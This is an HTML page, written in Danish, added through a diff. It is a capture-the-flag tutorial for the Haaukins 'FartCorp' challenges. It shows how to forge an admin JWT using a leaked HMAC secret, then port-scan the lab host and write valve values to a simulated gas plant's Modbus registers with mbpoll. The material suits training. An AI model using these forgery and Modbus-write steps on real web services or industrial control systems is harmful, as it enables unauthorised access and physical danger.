@@ -1,0 +1,41 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: FartCorp — tutorial (JWT-forgery &amp; Modbus/OT)</title>
+<meta name="description" content="Guide til Haaukins FartCorp: forfalsk en JWT med en lækket secret (More Power), og styr et gas-anlæg via Modbus/TCP på port 502 (Give us the Gas).">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>FartCorp (More Power / Give us the Gas)</h1>
+<p class="subtitle">Forfalsk en JWT med lækket secret, og styr et PLC-anlæg via Modbus.</p>
+<div class="badges"><span class="badge cat">Web / OT</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>More Power — forfalsk en JWT</h2>
+<p>JWT'en har <code>{"admin":false}</code> (HS256). <code>robots.txt</code> → en fil der lækker secret'en
+             (<code>BurnItAll</code>). Forfalsk <code>{"admin":true}</code> signeret med den:</p>
+             <pre><code>sig=b64u(hmac.new(b"BurnItAll",(h+'.'+p).encode(),hashlib.sha256).digest())
+curl -b "jwt=&lt;forged&gt;" http://fartcorp.hkn/   # flag + ny rute /gasgrid</code></pre>
+<h2>Give us the Gas — det er en OT/ICS-opgave</h2>
+<p><code>/gasgrid</code> er read-only, men en portscan afslører <strong>port 502 (Modbus/TCP)</strong>.
+             Valvene styres via Modbus holding-registre:</p>
+             <pre><code>nmap -p- fartcorp.hkn                 # 80 + 502/mbap
+mbpoll -m tcp -a 1 -t 4 -r 1 -c 5 -1 fartcorp.hkn      # læs 5 valve-vinkler
+mbpoll -m tcp -a 1 -t 4 -r 1 fartcorp.hkn 0 330 275 275 275   # ram måltryk uden overtryk</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Begge flag: #1 fra admin-siden efter JWT-forgery; #2 pushes via WebSocket når måltrykket rammes
+        uden danger.</p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>JWT: prøv <code>alg:none</code> først; ellers find/knæk secret'en og forfalsk claims.</li><li>Read-only dashboard + åben port 502 = OT/ICS-opgave; scan ALLE porte.</li><li>Modbus-recon med <code>mbpoll</code>; vindet krævede intermediate register-værdier (275).</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
